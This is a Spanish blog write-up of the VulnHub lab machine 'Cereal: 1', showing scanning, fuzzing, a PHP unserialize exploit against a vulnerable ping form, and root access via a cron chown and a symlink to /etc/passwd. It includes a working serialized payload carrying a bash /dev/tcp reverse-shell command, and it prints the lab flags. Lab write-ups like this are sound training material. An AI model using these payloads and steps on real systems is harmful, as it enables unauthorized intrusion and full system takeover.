---
layout: single
title: Cereal 1 - VulnHub
excerpt: "La maquina Cereal: 1 de la plataforma de VulnHub que esta catalogada como Medium es una maquina donde tendremos que aplicar mucho fuzzing para poder descubrir rutas y otro subdominio que tiene la maquina ademas vamos a estar usando los ataques de php deserialization para ganar acceso ala maquina y para convertirnos en el usuario root vamos a estar abusando de una tarea cron"
date: 2023-02-15
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-cereal/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - Subdomain Enumeration
  - Cron Job
  - PHP Deserialization 
---
![](/assets/images/vh-writeup-cereal/logo.png)

Vamos a empezar con la maquina 

## PortScan

```java
❯ sudo nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.100.28 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 23:57 CST
Nmap scan report for 192.168.100.28
Host is up (0.00066s latency).

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 00242bae41baac52d15d4fad00ce3967 (RSA)
|   256 1ae3c737522edcdd62610327551a866f (ECDSA)
|_  256 24fde78089c557fdf3e5c92f01e16b30 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 (())
|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
|_http-server-header: Apache/2.4.37 ()
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, afp: 
|_    Host '192.168.100.15' is not allowed to connect to this MariaDB server
11111/tcp open  tcpwrapped
22222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
22223/tcp open  tcpwrapped
33333/tcp open  tcpwrapped
33334/tcp open  tcpwrapped
44441/tcp open  http       Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
44444/tcp open  tcpwrapped
55551/tcp open  tcpwrapped
55555/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=2/14%Time=63EC7446%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.100\.15'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4D,"I
SF:\0\0\x01\xffj\x04Host\x20'192\.168\.100\.15'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server");
MAC Address: 00:0C:29:D9:33:3E (VMware)
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.54 seconds
```

La maquina tiene varios puertos abiertos entre ellos vemos 2 que son de tipo `http` y el puerto que ofrece el servicio `ftp` tambien esta abierto pero no hay gran cosa dentro.


## Enumeration

```ruby
❯ whatweb http://192.168.100.28
http://192.168.100.28 [403 Forbidden] Apache[2.4.37], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[Apache/2.4.37 ()], IP[192.168.100.28], PoweredBy[:], Title[Apache HTTP Server Test Page powered by: Rocky Linux]
```

Podemos ver que hay varias rutas

```lua
❯ sudo nmap --script http-enum -p80,44441 192.168.100.28 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 00:09 CST
Nmap scan report for 192.168.100.28
Host is up (0.0035s latency).

PORT      STATE SERVICE
80/tcp    open  http
| http-enum: 
|   /blog/: Blog
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /phpinfo.php: Possible information file
|   /blog/wp-login.php: Wordpress login page.
|_  /icons/: Potentially interesting folder w/ directory listing
44441/tcp open  unknown
MAC Address: 00:0C:29:D9:33:3E (VMware)
```

Si ves el codigo fuente la web esta arrastrando archivos de un subdominio asi que lo agregamos al `/etc/hosts` 

```
❯ /bin/cat /etc/hosts | tail -n 1
192.168.100.28 cereal.ctf
```
En la ruta `blog` esto es lo que nos muestra parece ser un `wordpress`

![](/assets/images/vh-writeup-cereal/Cerealblog.png)

Si hacemos un simple escaneo con `dirsearch` vemos que encontramos las mismas rutas

```shell
❯ dirsearch -u 192.168.100.28 -x 404,403 -t 200
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/192.168.100.28_23-02-15_00-18-38.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-02-15_00-18-38.log

Target: http://192.168.100.28/

[00:18:38] Starting: 
[00:18:45] 301 -  236B  - /admin  ->  http://192.168.100.28/admin/
[00:18:45] 200 -    2KB - /admin/?/login
[00:18:45] 200 -    2KB - /admin/
[00:18:45] 200 -    2KB - /admin/index.php
[00:18:50] 301 -  235B  - /blog  ->  http://192.168.100.28/blog/
[00:18:50] 200 -    7KB - /blog/wp-login.php
[00:18:50] 200 -   27KB - /blog/
[00:18:58] 200 -   75KB - /phpinfo.php
```

Revisando vemos que el wordpress no esta interpretando plugins

```
❯ curl -s -X POST http://cereal.ctf/blog/index.php/2021/05/29/update/ | grep -i plugins
```

Si probamos usando el usuario `cereal` en el panel de login vemos que el usuario es valido pero no sabemos su contraseña se podria hacer fuerza bruta pero no es la idea

![](/assets/images/vh-writeup-cereal/cerealblogwp.png)

Bueno como smb estaba abierto probe listar recursos compartidos pero no me muestra nada de hecho como que da errores tambien con otras herramientas de smb para enumerar

```
❯ smbmap -H 192.168.100.28 -u 'null'
[!] Authentication error on 192.168.100.28
```

Tambien hay otro panel de login

![](/assets/images/vh-writeup-cereal/Cerealadmin.png)

Algo a saber es que tambien esta otra puerto abierto que es http 

```
❯ cat targeted | grep "http" | grep -oP '\d{1,5}/tcp'
80/tcp
44441/tcp
```

Pero si vemos lo que hay en el puerto `44441` solo nos dice esto `coming soon`

![](/assets/images/vh-writeup-cereal/coming.png)

Podemos aplicar fuzzing tambien para descubrir mas rutas pero nada interesante

```go
❯ gobuster dir -u http://192.168.100.28:44441 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.28:44441
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/15 13:01:11 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 15]
```

Algo a saber es que si podemos fuzzear para ver si hay algun subdominio en el puerto 44441

```go
❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cereal.ctf:44441/ -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cereal.ctf:44441/
[+] Method:       GET
[+] Threads:      40
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/15 13:04:51 Starting gobuster in VHOST enumeration mode
===============================================================
Found: secure.cereal.ctf:44441 (Status: 200) [Size: 1538]
```

Incorporamos el dominio al `/etc/hosts`

```
❯ /bin/cat /etc/hosts | tail -n 1
192.168.100.28 cereal.ctf secure.cereal.ctf
```

Vemos que hay un ping test, si recargas la pagina la maquina hace ping continuamente

![](/assets/images/vh-writeup-cereal/pingtest.png)

Para probar Podemos ponernos en escucha con `tcpdump` en escucha de trasas icmp para ver que tal 

Vamos a hacernos un ping desde la web a nuestra ip para si resivimos la trasa

```
❯ sudo tcpdump -i ens33 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:12:30.839603 IP 192.168.100.28 > 192.168.100.15: ICMP echo request, id 1966, seq 1, length 64
13:12:30.839647 IP 192.168.100.15 > 192.168.100.28: ICMP echo reply, id 1966, seq 1, length 64
13:12:31.844275 IP 192.168.100.28 > 192.168.100.15: ICMP echo request, id 1966, seq 2, length 64
13:12:31.844295 IP 192.168.100.15 > 192.168.100.28: ICMP echo reply, id 1966, seq 2, length 64
13:12:32.867165 IP 192.168.100.28 > 192.168.100.15: ICMP echo request, id 1966, seq 3, length 64
13:12:32.867183 IP 192.168.100.15 > 192.168.100.28: ICMP echo reply, id 1966, seq 3, length 64
```

Y funciona la resivimos

Si tratamos de concatenar `;whoami` o alguna otra cosa no la va a interpretar ya que solo funciona para enviar un ping 

Algo que podemos hacer es ver el codigo fuente de la pagina vemos que esta cargando un archivo llamado `php.js`

![](/assets/images/vh-writeup-cereal/phpjs.png)


Para ver el archivo mas comodo ponemos transferirlo a nuestra maquina de atacante y ver que es lo que esta haciendo 

```shell
❯ sudo wget http://secure.cereal.ctf:44441/php.js
--2023-02-15 13:21:12--  http://secure.cereal.ctf:44441/php.js
Resolviendo secure.cereal.ctf (secure.cereal.ctf)... 192.168.100.28
Conectando con secure.cereal.ctf (secure.cereal.ctf)[192.168.100.28]:44441... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3699 (3.6K) [application/javascript]
Grabando a: «php.js»

php.js                          100%[=======================================================>]   3.61K  --.-KB/s    en 0s      

2023-02-15 13:21:12 (447 MB/s) - «php.js» guardado [3699/3699]
```

```php
❯ /bin/cat php.js
function serialize (mixedValue) {
  //  discuss at: https://locutus.io/php/serialize/
  // original by: Arpad Ray (mailto:arpad@php.net)
  // improved by: Dino
  // improved by: Le Torbi (https://www.letorbi.de/)
  // improved by: Kevin van Zonneveld (https://kvz.io/)
  // bugfixed by: Andrej Pavlovic
  // bugfixed by: Garagoth
  // bugfixed by: Russell Walker (https://www.nbill.co.uk/)
  // bugfixed by: Jamie Beck (https://www.terabit.ca/)
  // bugfixed by: Kevin van Zonneveld (https://kvz.io/)
  // bugfixed by: Ben (https://benblume.co.uk/)
  // bugfixed by: Codestar (https://codestarlive.com/)
  // bugfixed by: idjem (https://github.com/idjem)
  //    input by: DtTvB (https://dt.in.th/2008-09-16.string-length-in-bytes.html)
  //    input by: Martin (https://www.erlenwiese.de/)
  //      note 1: We feel the main purpose of this function should be to ease
  //      note 1: the transport of data between php & js
  //      note 1: Aiming for PHP-compatibility, we have to translate objects to arrays
  //   example 1: serialize(['Kevin', 'van', 'Zonneveld'])
  //   returns 1: 'a:3:{i:0;s:5:"Kevin";i:1;s:3:"van";i:2;s:9:"Zonneveld";}'
  //   example 2: serialize({firstName: 'Kevin', midName: 'van'})
  //   returns 2: 'a:2:{s:9:"firstName";s:5:"Kevin";s:7:"midName";s:3:"van";}'
  //   example 3: serialize( {'ü': 'ü', '四': '四', '𠜎': '𠜎'})
  //   returns 3: 'a:3:{s:2:"ü";s:2:"ü";s:3:"四";s:3:"四";s:4:"𠜎";s:4:"𠜎";}'

  let val, key, okey
  let ktype = ''
  let vals = ''
  let count = 0

  const _utf8Size = function (str) {
    return ~-encodeURI(str).split(/%..|./).length
  }

  const _getType = function (inp) {
    let match
    let key
    let cons
    let types
    let type = typeof inp

    if (type === 'object' && !inp) {
      return 'null'
    }

    if (type === 'object') {
      if (!inp.constructor) {
        return 'object'
      }
      cons = inp.constructor.toString()
      match = cons.match(/(\w+)\(/)
      if (match) {
        cons = match[1].toLowerCase()
      }
      types = ['boolean', 'number', 'string', 'array']
      for (key in types) {
        if (cons === types[key]) {
          type = types[key]
          break
        }
      }
    }
    return type
  }

  const type = _getType(mixedValue)

  switch (type) {
    case 'function':
      val = ''
      break
    case 'boolean':
      val = 'b:' + (mixedValue ? '1' : '0')
      break
    case 'number':
      val = (Math.round(mixedValue) === mixedValue ? 'i' : 'd') + ':' + mixedValue
      break
    case 'string':
      val = 's:' + _utf8Size(mixedValue) + ':"' + mixedValue + '"'
      break
    case 'array':
    case 'object':
      val = 'a'
      /*
      if (type === 'object') {
        var objname = mixedValue.constructor.toString().match(/(\w+)\(\)/);
        if (objname === undefined) {
          return;
        }
        objname[1] = serialize(objname[1]);
        val = 'O' + objname[1].substring(1, objname[1].length - 1);
      }
      */

      for (key in mixedValue) {
        if (mixedValue.hasOwnProperty(key)) {
          ktype = _getType(mixedValue[key])
          if (ktype === 'function') {
            continue
          }

          okey = (key.match(/^[0-9]+$/) ? parseInt(key, 10) : key)
          vals += serialize(okey) + serialize(mixedValue[key])
          count++
        }
      }
      val += ':' + count + ':{' + vals + '}'
      break
    case 'undefined':
    default:
      // Fall-through
      // if the JS object has a property which contains a null value,
      // the string cannot be unserialized by PHP
      val = 'N'
      break
  }
  if (type !== 'object' && type !== 'array') {
    val += ';'
  }

  return val
}
```

Estan usando serializacion de objetos

- [aqui tienes mas informacion](https://www.php.net/manual/es/language.oop5.serialization.php)

Otra cosa que podemos hacer es con burpsuite interceptar la peticion del ping para ver por detras como se esta empleando 

Vamos a poner una ip y al hacer click en el boton de ping deberia de interceptar

![](/assets/images/vh-writeup-cereal/interceptarpeticion.png)

Al darle click burpsuite la intercepta

![](/assets/images/vh-writeup-cereal/burpsuiteintercepto.png)

Vamos a hacer un `ctrl+r` para emitirlo al repeater

Vamos a hacer un `ctrl+shift+u` para url decodear lo que esta en `obj=` y podemos ver que esta haciendo

![](/assets/images/vh-writeup-cereal/urldecodeado.png)

Las letras `s` representan una `string` pero en el codigo que nos descargamos no vemos una forma de como emplea la Deserializacion asi que podemos tratar de hacer fuzzing en la ruta 

```
❯ wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://secure.cereal.ctf:44441/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://secure.cereal.ctf:44441/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================
000000324:   200        123 L    447 W      3675 Ch     "php"                                                          
000000901:   200        149 L    278 W      3118 Ch     "style"                                                        
000000001:   200        49 L     140 W      1538 Ch     "index" 
```

Vamos a fuzzear por archivos `.php`

```
❯ wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://secure.cereal.ctf:44441/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://secure.cereal.ctf:44441/FUZZ.php
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000001:   200        49 L     140 W      1538 Ch     "index"       
```

Como no encuentra gran cosa vamos a usar un diccionario mucho mas grande y vamos a emplear `gobuster` ya que va mas rapido

```shell
❯ gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://secure.cereal.ctf:44441/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/15 13:54:22 Starting gobuster in directory enumeration mode
===============================================================
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1538]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]
```

Nos encuentra un `back_en`

Y esto es lo que nos muestra no tenemos capacidad de directory listing para ver el contenido

![](/assets/images/vh-writeup-cereal/back_en.png)

Podemos emplear fuzzing para ver otras rutas apartir de `/back_en` podemos poner que nos busque por `.php.back` y si nos encuentra algo

```
❯ wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://secure.cereal.ctf:44441/back_en/FUZZ.php.bak
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://secure.cereal.ctf:44441/back_en/FUZZ.php.bak
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000001:   200        79 L     155 W      1814 Ch     "index"       
```

Esto es lo que nos muestra la web

![](/assets/images/vh-writeup-cereal/indexphp_back.png)

Podemos ver el codigo fuente

```php
<?php

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}

if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();

echo "<html>
<head>
<script src=\"http://secure.cereal.ctf:44441/php.js\"></script>
<script>
function submit_form() {
		var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});
		object = object.substr(object.indexOf(\"{\"),object.length);
		object = \"O:8:\\\"pingTest\\\":1:\" + object;
		document.forms[\"ipform\"].obj.value = object;
		document.getElementById('ipform').submit();
}
</script>
<link rel='stylesheet' href='http://secure.cereal.ctf:44441/style.css' media='all' />
<title>Ping Test</title>
</head>
<body>
<div class=\"form-body\">
<div class=\"row\">
    <div class=\"form-holder\">
	<div class=\"form-content\">
	    <div class=\"form-items\">
		<h3>Ping Test</h3>
		
		<form method=\"POST\" action=\"/\" id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>

		    <div class=\"col-md-12\">
			<input name=\"obj\" type=\"hidden\" value=\"\">
		       <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>
		    </div>
		<br />
		    <div class=\"form-button mt-3\">
			<input type=\"submit\" value=\"Ping!\">
			<br /><br /><textarea>$pingTest->output</textarea>
		    </div>
		</form>
	    </div>
	</div>
    </div>
</div>
</div>
</body>
</html>";

?>
```

Ahora si nos esta diciendo como es que esta usando `unserialize` y te lo url decodea lo que le hayas pasado no hay sanitizacion ya que si por post tramitas un dato te hace el `unserialize` de la data correspondiente si le pasas una ip el campo `isValid` lo convierte a `true` aunque `$isValid` esta puesto como `False`  si se iniciara con `True` no haria la validacion lo que tenemos que hacer en enviar el dato serializado 

Vamos a copearnos estas lineas

```php
<?php

class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = False;
        public $output = "";
}
```

Nos vamos a crear un archivo y vamos a pegar esas lineas

Tenemos que cambiar la ip del localhost para que nos mande una bash directamente y aplique el `serialize`

```php
❯ /bin/cat pwned.php
<?php

class pingTest {
        public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/TuIP/443 0>&1'";
        public $isValid = True;
        public $output = "";
}

echo urlencode(serialize(new pingTest));
?>
```

Y funciona

```
❯ sudo php pwned.php 2>/dev/null; echo
O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A55%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.100.15%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D
```

Nos vamos a poner en escucha en el puerto `443`

```
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y en burpsuite con la peticion que ya habimos hecho vamos a cambiar el dato por el de nosotros serializado y vamos a darle al enter para obtener una reverse shell 

![](/assets/images/vh-writeup-cereal/reverseshellburp.png)

## Shell apache

```shell
❯ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.28] 39394
bash: cannot set terminal process group (942): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ whoami
whoami
apache
bash-4.4$ 
```

Para tener una mejor shell hacer un:

```shell
script /dev/null -c bash
stty raw echo; fg
reset xterm 
ENTER
```

```shell
bash-4.4$ whoami
apache
bash-4.4$ export TERM=xterm
bash-4.4$ export SHELL=bash
bash-4.4$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.4$ hostname 
cereal.ctf
bash-4.4$ 
```

Hay un usuario llamado `rocky`

```shell
bash-4.4$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
rocky:x:1000:1000::/home/rocky:/bin/bash
bash-4.4$ 
```

Podemos ver la primer flag

```shell
bash-4.4$ cat local.txt 
aaa87365bf3dc0c1a82aa14b4ce26bbc
bash-4.4$ pwd
/home/rocky
bash-4.4$ 
```

Vamos a buscar por privilegios SUID

```shell
bash-4.4$ find / -perm -4000 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/cockpit-session
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
bash-4.4$ 
```

Podriamos aprovecharnos del `pkexec` pero no es la idea si vemos nuestro path vemos que es pequeño asi que podemos exportar el de nosotros para que sea mas grande

```shell
bash-4.4$ echo $PATH
/usr/local/bin:/usr/bin
bash-4.4$ 
```

```shell
export PATH=tuPATH
```

Funciona

```shell
bash-4.4$ which getcap
/usr/sbin/getcap
bash-4.4$ 
```

Vamos a buscar capabilities

```shell
bash-4.4$ which getcap
/usr/sbin/getcap
bash-4.4$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr-packet = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
bash-4.4$ 
```

## Escalada de privilegios

Despues de enumerar el sistema y ver que no hay gran cosa vamos a buscar por tareas cron vamos a usar `pspy`

- [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1)

Vamos a transferirlo ala maquina

```shell
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.28 - - [15/Feb/2023 14:52:31] "GET /pspy64 HTTP/1.1" 200 -
```

```shell
bash-4.4$ wget http://192.168.100.15:80/pspy64
--2023-02-15 20:52:25--  http://192.168.100.15/pspy64
Connecting to 192.168.100.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                          100%[=======================================================>]   2.96M  --.-KB/s    in 0.03s   

2023-02-15 20:52:25 (102 MB/s) - 'pspy64' saved [3104768/3104768]

bash-4.4$ ls
pspy64
bash-4.4$ 
```

Vemos que el pspy nos muestra esto que llama la atencion `chown rocky:apache /home/rocky/public_html/back_en` y mas rutas

```shell
bash-4.4$ cd /home/rocky/public_html/
bash-4.4$ ls
back_en  index.php  php.js  style.css
bash-4.4$ ls -l
total 12
drwxrwxr-x. 2 rocky apache   44 May 29  2021 back_en
-rwxrwxr-x. 1 rocky apache 1814 May 29  2021 index.php
-rwxrwxr-x. 1 rocky apache 3699 May 29  2021 php.js
-rwxrwxr-x. 1 rocky apache 3118 May 29  2021 style.css
bash-4.4$ 
```

Podemos crear un enlace simbolico 

```shell
bash-4.4$ ln -s -f /etc/passwd passwd
bash-4.4$ ls -l
total 12
drwxrwxr-x. 2 rocky  apache   44 May 29  2021 back_en
-rwxrwxr-x. 1 rocky  apache 1814 May 29  2021 index.php
lrwxrwxrwx  1 apache apache   11 Feb 15 21:22 passwd -> /etc/passwd
-rwxrwxr-x. 1 rocky  apache 3699 May 29  2021 php.js
-rwxrwxr-x. 1 rocky  apache 3118 May 29  2021 style.css
```

Vamos a asignar una contraseña para la migracion yo voy a poner como contraseña `hola` puedes poner lo que quieras

```shell
bash-4.4$ openssl passwd
Password: 
Verifying - Password: 
g.bHmvuXV5hFI
```

Vamos a esperar para que cambie

```shell
bash-4.4$  watch -n 1 ls -l /etc/passwd
```

Despues de unos momentos cambia

```shell
-rwxrwxr-x. 1 rocky apache 1549 May 29  2021 /etc/passwd
```

Ahora vamos a modificar el `/etc/passwd` y donde esta la `x` vamos a poner la contraseña que asignamos para que no valla al shadow 

Basicamente donde esta la `x` hay que cambiala por lo que te dio al escribir la contraseña con openssl

```shell
root:g.bHmvuXV5hFI:0:0:root:/root:
```

## Root

```shell
bash-4.4$ su root
Password: 
[root@cereal public_html]# whoami
root
[root@cereal public_html]# cd /root
[root@cereal ~]# ls
anaconda-ks.cfg  listener.sh  proof.txt
[root@cereal ~]# cat proof.txt 
Well done! You have completed Cereal.

  ____                    _ 
 / ___|___ _ __ ___  __ _| |
| |   / _ \ '__/ _ \/ _` | |
| |__|  __/ | |  __/ (_| | |
 \____\___|_|  \___|\__,_|_|
                            

This box was brought to you by Bootlesshacker.

Follow me on Twitter: @bootlesshacker
My website: https://www.bootlesshacker.com

Root Flag: 1aeb5db4e979543cb807cfd90df77763
[root@cereal ~]# 
```
































































































































